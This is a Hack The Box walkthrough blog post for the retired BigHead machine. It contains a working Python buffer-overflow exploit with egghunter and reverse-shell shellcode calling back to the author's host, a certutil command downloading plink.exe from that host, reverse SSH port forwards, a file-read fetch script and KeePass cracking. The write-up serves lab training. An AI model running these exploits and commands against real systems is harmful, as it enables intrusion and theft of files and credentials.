---
layout: post
title: "BigHead: Hack The Box Walkthrough"
date: 2019-05-05 03:02:33 +0000
last_modified_at: 2019-05-05 03:07:42 +0000
category: Walkthrough
tags: ["Hack The Box", BigHead, retired]
comments: true
image:
  feature: bighead-htb-walkthrough.jpg
  credit: 3mrgnc3 / BigHead
  creditlink: https://www.hackthebox.eu/home/machines/profile/164
---

This post documents the complete walkthrough of BigHead, a retired vulnerable [VM][1] created by [3mrgnc3][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

BigHead is an active vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.112 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-03 08:08:15 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.112
```

Interesting. Only one open port. Let's see what `nmap` gives us.

```
# nmap -n -v -Pn -p80 -A --reason -oN nmap.txt 10.10.10.112
...
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 nginx 1.14.0
| http-methods:
|_  Supported Methods: GET
|_http-server-header: nginx/1.14.0
|_http-title: PiperNet Comes
```

There's only one service and this is how the site looks like.

<a class="image-popup">
![8440d9e1.png](/assets/images/posts/bighead-htb-walkthrough/8440d9e1.png)
</a>

### Directory/File Enumeration

Let's use `gobuster` and `raft`'s directory list, and see what we get.

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 20 -e -u http://bighead.htb/                          

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bighead.htb/
[+] Threads      : 20
[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt                                                                                  
[+] Status codes : 200,204,301,302,307,403
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2019/04/09 05:04:58 Starting gobuster
=====================================================
http://bighead.htb/images (Status: 301)
http://bighead.htb/assets (Status: 301)
http://bighead.htb/backend (Status: 302)
http://bighead.htb/updatecheck (Status: 302)
http://bighead.htb/backends (Status: 302)
=====================================================
2019/04/09 05:14:39 Finished
=====================================================
```

As long as the path contains the word 'backend', you'll get redirected to `/BigHead`, an error page that looks like this.

<a class="image-popup">
![360f7de9.png](/assets/images/posts/bighead-htb-walkthrough/360f7de9.png)
</a>

Well, the link doesn't lead to anything but at least I know I need to add `bighead.htb` to `/etc/hosts`.

<a class="image-popup">
![0a30dbb6.png](/assets/images/posts/bighead-htb-walkthrough/0a30dbb6.png)
</a>

Checking on `/updatecheck` led to a more interesting discovery.

<a class="image-popup">
![5499c1ad.png](/assets/images/posts/bighead-htb-walkthrough/5499c1ad.png)
</a>

Let's pop in `code.bighead.htb` to `/etc/hosts` as well.

<a class="image-popup">
![50ba6e95.png](/assets/images/posts/bighead-htb-walkthrough/50ba6e95.png)
</a>

Nice. That's some progress, at least we know the operating system and its architecture. Let's turn our attention to the newly discovered subdomain.

<a class="image-popup">
![a97f05e1.png](/assets/images/posts/bighead-htb-walkthrough/a97f05e1.png)
</a>

Eventually, it'll redirect to `http://127.0.0.1:5080/testlink/login.php`. It appears that I can access the good stuff locally. Well, I can always spoof my source IP with the `X-Forwarded-For` header.

<a class="image-popup">
![ca37e165.png](/assets/images/posts/bighead-htb-walkthrough/ca37e165.png)
</a>

Sweet.

Let's do what we always do after discovering a new subdomain or new path: `wfuzz`.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --sc 200 -t 20 http://code.bighead.htb/testlink/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://code.bighead.htb/testlink/FUZZ
Total requests: 26593

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

000238:  C=200      0 L        2 W          136 Ch        "index"
000036:  C=200     48 L     1641 W        18681 Ch        "logout"
000039:  C=200     43 L     1342 W        15951 Ch        "login"
000687:  C=200      4 L       78 W          932 Ch        "plugin"
001514:  C=200    340 L     2968 W        18009 Ch        "license"
002983:  C=200   3448 L    45425 W        306612 Ch       "changelog"
003597:  C=200      8 L       38 W          218 Ch        "note"
003809:  C=200      0 L        2 W          136 Ch        ""
007697:  C=200      0 L        2 W          136 Ch        ""
009261:  C=200      2 L       16 W          447 Ch        "linkto"
018043:  C=404     44 L      102 W         1054 Ch        "espritxml"^C
Finishing pending requests...
```

I've seen enough. `/testlink` is an instance of [TestLink Open Source Test & Requirement Management System](https://github.com/TestLinkOpenSourceTRMS/testlink-code) and it's running Version 1.9.17.

<a class="image-popup">
![dcf17eff.png](/assets/images/posts/bighead-htb-walkthrough/dcf17eff.png)
</a>

There's also a hint of another subdomain in `/note`.

<a class="image-popup">
![1d98e932.png](/assets/images/posts/bighead-htb-walkthrough/1d98e932.png)
</a>

Let's move on to the new subdomain.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt --hc '302,400,403,404' http://dev.bighead.htb/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://dev.bighead.htb/FUZZ
Total requests: 38267

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

007220:  C=418      1 L        3 W           46 Ch        "coffee"

Total time: 782.2963
Processed Requests: 38267
Filtered Requests: 38266
Requests/sec.: 48.91624
```

Well, well, well. What have we here?

<a class="image-popup">
![4e236e11.png](/assets/images/posts/bighead-htb-walkthrough/4e236e11.png)
</a>

Like they say in real life, coffee and Google are a developer's best friends.

<a class="image-popup">
![79ceb44c.png](/assets/images/posts/bighead-htb-walkthrough/79ceb44c.png)
</a>

Let's clone the entire repository.

```
# git clone https://github.com/3mrgnc3/BigheadWebSvr.git
cd BigheadWebSvr/
```

Once we have done that, we can look at the commits.

<a class="image-popup">
![9117be9b.png](/assets/images/posts/bighead-htb-walkthrough/9117be9b.png)
</a>

Long story short, the archive from the latest commit is password-protected, so we are going to check out an older commit "Nelson's Web Server Backup", which has all the good stuff.

```
# git checkout -b raw_is_war b1b4d6ed5f2298bc243cd56cab77cd6fb4e48c3d
Switched to a new branch 'raw_is_war'
```

<a class="image-popup">
![db51f060.png](/assets/images/posts/bighead-htb-walkthrough/db51f060.png)
</a>

Alas, the archive is still password-protected. Nonetheless, I wrote a simple `bash` script to brute-force the password, using `7z` as the main driver.

```bash
#!/bin/bash

OUT=$1
ZIP=${OUT}.zip

function die() {
  killall perl
}

if 7z e $ZIP -o"$OUT" -p"$2" -y &>/dev/null; then
  echo "[+] Password: $2"; die
fi
```

It has two arguments: the first one is name of the archive file, the second one is the password. Using GNU Parallel and `rockyou.txt`, I was able to crack the password pretty fast.

<a class="image-popup">
![1e5f20ae.png](/assets/images/posts/bighead-htb-walkthrough/1e5f20ae.png)
</a>

Of course, the password is `bighead`. Silly me!

### Vulnerability Analysis of `BigheadWebSvr.exe`

At first, I was pretty apprehended by the fact that the executable imports a number of DLLs. It turns out to be unfounded fear. It uses only the `EssentialFunc1` from `bHeadSvr.dll` and it basically prints out diagnostic messages to the standard output. A couple of step-throughs into the `main` function, I saw that the executable creates a new thread whenever it gets a new connection. The thread basically delegates handling of the incoming connection to a `ConnectionHandler` function illustrated below.

<a class="image-popup">
![1f29a7d3.png](/assets/images/posts/bighead-htb-walkthrough/1f29a7d3.png)
</a>

Long story short, the vulnerability lies in this graph node.

<a class="image-popup">
![eb877ef9.png](/assets/images/posts/bighead-htb-walkthrough/eb877ef9.png)
</a>

Step into the function and you'll notice the unsafe C function used—`strcpy`. Buffer overflow spotted!

<a class="image-popup">
![48ec551c.png](/assets/images/posts/bighead-htb-walkthrough/48ec551c.png)
</a>

### Exploit Development

Now that we know a buffer overflow vulnerability exists in `BigheadWebSvr.exe`, let's use Immunity Debugger and `mona.py` to assist in the development of an exploit.

In order to get to `Function4`, we need to meet these conditions:

1. Request size must be smaller than 219 bytes
2. Request method must be **HEAD**

This is the command I use.

```
$ curl -I http://127.0.0.1:8008/$(perl -e 'print "A" x 72 . "B" x 8')
```

_Just before `strcpy` is called_

<a class="image-popup">
![ad43b3d4.png](/assets/images/posts/bighead-htb-walkthrough/ad43b3d4.png)
</a>

_Stack of thread before `strcpy` is called_

<a class="image-popup">
![23056f26.png](/assets/images/posts/bighead-htb-walkthrough/23056f26.png)
</a>

_Stack of thread after `strcpy` is called_

<a class="image-popup">
![1a6131fb.png](/assets/images/posts/bighead-htb-walkthrough/1a6131fb.png)
</a>

Notice that there are thirty-six bytes of space to overwrite before the return address. On top of that, there's something worth mentioning here—a logic exists within `BigheadWebSvr.exe` that turns hexadecimal strings (two characters in the range of `[0-9a-fA-F]`), into a byte, specifically using the `strtoul` function. It could be an attempt by the creator to throw us off at exploit development, who knows?

One more thing, there are more spaces, even though it isn't much, after the location where the return address is overwritten, perfect for an egghunter shellcode, which only takes up 32 bytes.

Now that we can control the return address to change execution flow, we can put in an address that contains JMP ESP opcodes. Using `!mona jmp -r esp`, these are the addresses that contain JMP ESP.

<a class="image-popup">
![bada8666.png](/assets/images/posts/bighead-htb-walkthrough/bada8666.png)
</a>

Any of the above return addresses will lead us into the egghunter shellcode, which can also be generated by `mona.py`, using `!mona egg -t b33f`

<a class="image-popup">
![3fba1e6a.png](/assets/images/posts/bighead-htb-walkthrough/3fba1e6a.png)
</a>

And since BigheadWebSvr.exe is a multi-threaded application, we can send in as many eggs (the exploit payload) as we want, to increase the stability and chances of the exploit occuring before we send the egghunter. Armed with this knowledge, here's the exploit code.

<div class="filename"><span>exploit.py</span></div>

```python
#!/usr/bin/env python

import os
import socket
import sys

# !mona egg -t b33f
egghunter = (
"6681caff0f42526a0258cd2e3c055a74"
"efb8623333668bfaaf75eaaf75e7ffe7")

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.127 LPORT=8888 EXITFUNC=thread -b '\x00\x0a\x0d\x20\x3d\x3f' -f c
egg = (
"\xb8\x50\x61\x24\x5d\xd9\xe8\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xc3\x04\x31\x43\x0e\x03\x13\x6f\xc6\xa8\x6f\x87\x84"
"\x53\x8f\x58\xe9\xda\x6a\x69\x29\xb8\xff\xda\x99\xca\xad\xd6"
"\x52\x9e\x45\x6c\x16\x37\x6a\xc5\x9d\x61\x45\xd6\x8e\x52\xc4"
"\x54\xcd\x86\x26\x64\x1e\xdb\x27\xa1\x43\x16\x75\x7a\x0f\x85"
"\x69\x0f\x45\x16\x02\x43\x4b\x1e\xf7\x14\x6a\x0f\xa6\x2f\x35"
"\x8f\x49\xe3\x4d\x86\x51\xe0\x68\x50\xea\xd2\x07\x63\x3a\x2b"
"\xe7\xc8\x03\x83\x1a\x10\x44\x24\xc5\x67\xbc\x56\x78\x70\x7b"
"\x24\xa6\xf5\x9f\x8e\x2d\xad\x7b\x2e\xe1\x28\x08\x3c\x4e\x3e"
"\x56\x21\x51\x93\xed\x5d\xda\x12\x21\xd4\x98\x30\xe5\xbc\x7b"
"\x58\xbc\x18\x2d\x65\xde\xc2\x92\xc3\x95\xef\xc7\x79\xf4\x67"
"\x2b\xb0\x06\x78\x23\xc3\x75\x4a\xec\x7f\x11\xe6\x65\xa6\xe6"
"\x09\x5c\x1e\x78\xf4\x5f\x5f\x51\x33\x0b\x0f\xc9\x92\x34\xc4"
"\x09\x1a\xe1\x4b\x59\xb4\x5a\x2c\x09\x74\x0b\xc4\x43\x7b\x74"
"\xf4\x6c\x51\x1d\x9f\x97\x32\x28\x6a\x9b\xe4\x44\x68\xa3\xca"
"\x2c\xe5\x45\x60\x5d\xa0\xde\x1d\xc4\xe9\x94\xbc\x09\x24\xd1"
"\xff\x82\xcb\x26\xb1\x62\xa1\x34\x26\x83\xfc\x66\xe1\x9c\x2a"
"\x0e\x6d\x0e\xb1\xce\xf8\x33\x6e\x99\xad\x82\x67\x4f\x40\xbc"
"\xd1\x6d\x99\x58\x19\x35\x46\x99\xa4\xb4\x0b\xa5\x82\xa6\xd5"
"\x26\x8f\x92\x89\x70\x59\x4c\x6c\x2b\x2b\x26\x26\x80\xe5\xae"
"\xbf\xea\x35\xa8\xbf\x26\xc0\x54\x71\x9f\x95\x6b\xbe\x77\x12"
"\x14\xa2\xe7\xdd\xcf\x66\x07\x3c\xc5\x92\xa0\x99\x8c\x1e\xad"
"\x19\x7b\x5c\xc8\x99\x89\x1d\x2f\x81\xf8\x18\x6b\x05\x11\x51"
"\xe4\xe0\x15\xc6\x05\x21")

stage1 = "b33fb33f" + egg
stage2 = "A" * 72 + "FD125062" + egghunter # 0x625012fd - jmp esp

request = (
"%s /%s HTTP/1.1\r\n"
"Host: dev.bighead.htb\r\n\r\n")

# send stage 1 - egg (1st)
evil = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
evil.connect(("10.10.10.112", 80))
evil.send(request % ("GET", stage1))
evil.recv(1024)
os.write(1, "[+] 1st egg sent!\n")
evil.close()

# send stage 1 - egg (2nd)
evil = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
evil.connect(("10.10.10.112", 80))
evil.send(request % ("GET", stage1))
evil.recv(1024)
os.write(1, "[+] 2nd egg sent!\n")
evil.close()

# send stage 1 - egg (3rd)
evil = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
evil.connect(("10.10.10.112", 80))
evil.send(request % ("GET", stage1))
evil.recv(1024)
os.write(1, "[+] 3rd egg sent!\n")
evil.close()

# send stage 2 - egghunter
evil = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
evil.connect(("10.10.10.112", 80))
evil.send(request % ("HEAD", stage2))
os.write(1, "[+] Egghunter sent!\n")
evil.recv(1024)
evil.close()
```

## Low-Privilege Shell

I'm guessing a variant of the vulnerable `BigheadWebSvr.exe` is behind `dev.bighead.htb`. The `nginx.conf` that comes with it confirms my hypothesis.

<a class="image-popup">
![8bba27ec.png](/assets/images/posts/bighead-htb-walkthrough/8bba27ec.png)
</a>

With that in mind, let's give the exploit a shot!

<a class="image-popup">
![2db3e7e4.png](/assets/images/posts/bighead-htb-walkthrough/2db3e7e4.png)
</a>

Woohoo. I got shell as `Nelson`!

<a class="image-popup">
![d2fdebb7.png](/assets/images/posts/bighead-htb-walkthrough/d2fdebb7.png)
</a>

Too bad the excitement was short-lived because this isn't the `user.txt` I expected.

<a class="image-popup">
![e8e0ed4a.png](/assets/images/posts/bighead-htb-walkthrough/e8e0ed4a.png)
</a>

Curse you, Erlich!

### BitVise SSH Server

During enumeration of `nelson`'s account, I notice two interesting open ports: `2020/tcp` and `5080/tcp` that weren't available during the port scan.

<a class="image-popup">
![2ca2bf8e.png](/assets/images/posts/bighead-htb-walkthrough/2ca2bf8e.png)
</a>

The PIDs associated with the ports are BitVise SSH Server and Apache from XAMPP respectively.

<a class="image-popup">
![3fa724af.png](/assets/images/posts/bighead-htb-walkthrough/3fa724af.png)
</a>

The program directory of BitVise SSH Server is strangely located at `C:\Program Files\nginx manager`. Maybe the user account `nginx` has something to do with it? Unfortunately, `nelson` doesn't have access to the Service Control Manager (SCM) to query the services, I have to fall back on good ol' `REG.exe` to query the services.

<a class="image-popup">
![cde438a3.png](/assets/images/posts/bighead-htb-walkthrough/cde438a3.png)
</a>

Guess what? There's really something special with this service.

<a class="image-popup">
![70e0d655.png](/assets/images/posts/bighead-htb-walkthrough/70e0d655.png)
</a>

Naturally, `PasswordHash` and `Authenticate`, caught my attention but it turns out that `PasswordHash` is another troll by the creator.

<a class="image-popup">
![57d32929.png](/assets/images/posts/bighead-htb-walkthrough/57d32929.png)
</a>

Let's check out `Authenticate`.

<a class="image-popup">
![b0844868.png](/assets/images/posts/bighead-htb-walkthrough/37c95151.png)
</a>

`H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87` sure looks promising. Could this be `nginx`'s SSH password? If so, how do I connect to the SSH server? `plink.exe` to the rescue! Obviously, outbound connections from the machine are not blocked. I can easily set up a SSH server on my attacking machine and use `plink.exe` to connect to my server and forward the local port to a port I specify. I know what you are thinking. How do you transfer `plink.exe` to the machine? `certutil.exe` is the answer.

_Transfer `plink.exe`_

First, we set up Python's SimpleHTTPServer to host the file. Then we pull the file using the following command.

```
certutil -urlcache -split -f http://10.10.15.127/plink.exe c:\users\nelson\appdata\local\temp\plink.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

_Set up SSH server_

In order for the local port to be forwarded to the remote port, `GatewayPorts` need to be enabled in `/etc/ssh/sshd_config`:

```
GatewayPorts yes
```

_Port forwarding with plink.exe_

Forward both ports: `2020/tcp` and `5080/tcp` with plink.exe like so.

```
start /min plink -R 2020:localhost:2020 -pw <password> root@10.10.15.127 -N
start /min plink -R 5080:localhost:5080 -pw <password> root@10.10.15.127 -N
```

Once that's done, we can give a shot at logging in to `nginx`'s account.

<a class="image-popup">
![9d3e1562.png](/assets/images/posts/bighead-htb-walkthrough/9d3e1562.png)
</a>

Holy cow. It works!

<a class="image-popup">
![30a18ac9.png](/assets/images/posts/bighead-htb-walkthrough/30a18ac9.png)
</a>

### Getting to `user.txt`

I was absolutely thrilled to see `user.txt` in current working directory which seems to be `c:\xampp`.

<a class="image-popup">
![592fa067.png](/assets/images/posts/bighead-htb-walkthrough/592fa067.png)
</a>

Only to realize it's a Windows Shortcut File (or LNK File). :angry:

<a class="image-popup">
![2468cedb.png](/assets/images/posts/bighead-htb-walkthrough/2468cedb.png)
</a>

Well, at least now I know where `user.txt` is located and this is the real deal. While I was smashing my head trying to figure out how to read `c:\users\nginx\desktop\user.txt`, I saw something extraordinary at `/apps/testlink/htdocs/logs/userlog0.log`.

<a class="image-popup">
![0ec6e212.png](/assets/images/posts/bighead-htb-walkthrough/0ec6e212.png)
</a>

Something funky is going on in `linkto.php`!

<a class="image-popup">
![a3719128.png](/assets/images/posts/bighead-htb-walkthrough/a3719128.png)
</a>

Can you see the vulnerability? We can read files as long as there are two POST parameter: `PiperID` and `PiperCoinID` (path to the file). Let's read `c:\users\nginx\desktop\user.txt`!

<a class="image-popup">
![4c515d00.png](/assets/images/posts/bighead-htb-walkthrough/4c515d00.png)
</a>

### Getting to `root.txt`

Armed with this knowledge, I wrote a `bash` script that allows me to fetch files and display them on the standard output, given the file path as the arguement.

<div class="filename"><span>fetch.sh</span></div>

```bash
#!/bin/bash

GARBAGE=18684
TEMP=$(mktemp -u)
FILE=$1

curl -s \
     -d "PiperID=" \
     -d "PiperCoinID=$FILE" \
     -o $TEMP \
     http://127.0.0.1:5080/testlink/linkto.php

SIZE=$(wc -c < $TEMP)

dd if=$TEMP count=$((SIZE - GARBAGE)) bs=1 2>/dev/null

# clean up
rm -f $TEMP
```

Let's see if we can read `root.txt`.

<a class="image-popup">
![7d60a8f8.png](/assets/images/posts/bighead-htb-walkthrough/7d60a8f8.png)
</a>

Seriously, WTF??!! Wait a tick, maybe I can read other files in `c:\users\administrator`? During my enumeration I also noticed KeePass was installed at `c:\Program Files\kpps`. According to KeePass Help Center, the [configuration](https://keepass.info/help/base/configuration.html) file is stored at:

<a class="image-popup">
![29da67bc.png](/assets/images/posts/bighead-htb-walkthrough/29da67bc.png)
</a>

Time to check out the configuration file.

<a class="image-popup">
![bf5533a2.png](/assets/images/posts/bighead-htb-walkthrough/bf5533a2.png)
</a>

Awesome. We can see where the KeePass database and key files are. As usual, they are not at your usual locations.

<a class="image-popup">
![606c141f.png](/assets/images/posts/bighead-htb-walkthrough/606c141f.png)
</a>

Time to "fetch" them.

<a class="image-popup">
![2021fb0a.png](/assets/images/posts/bighead-htb-walkthrough/2021fb0a.png)
</a>

Interesting choice for a key file. JtR has a nifty tool that turns the key file and the KeePass database into a hash for cracking.

<a class="image-popup">
![84c752a2.png](/assets/images/posts/bighead-htb-walkthrough/84c752a2.png)
</a>

The master password (`darkness`) is easily cracked.

<a class="image-popup">
![53c30d90.png](/assets/images/posts/bighead-htb-walkthrough/53c30d90.png)
</a>

All that's left is to load the database and see what's inside.

<a class="image-popup">
![069d5e11.png](/assets/images/posts/bighead-htb-walkthrough/069d5e11.png)
</a>

We are in the endgame now.

<a class="image-popup">
![f09bf72b.png](/assets/images/posts/bighead-htb-walkthrough/f09bf72b.png)
</a>

And here's `root.txt`.

<a class="image-popup">
![b797b36d.png](/assets/images/posts/bighead-htb-walkthrough/b797b36d.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/164
[2]: https://www.hackthebox.eu/home/users/profile/6983
[3]: https://www.hackthebox.eu/
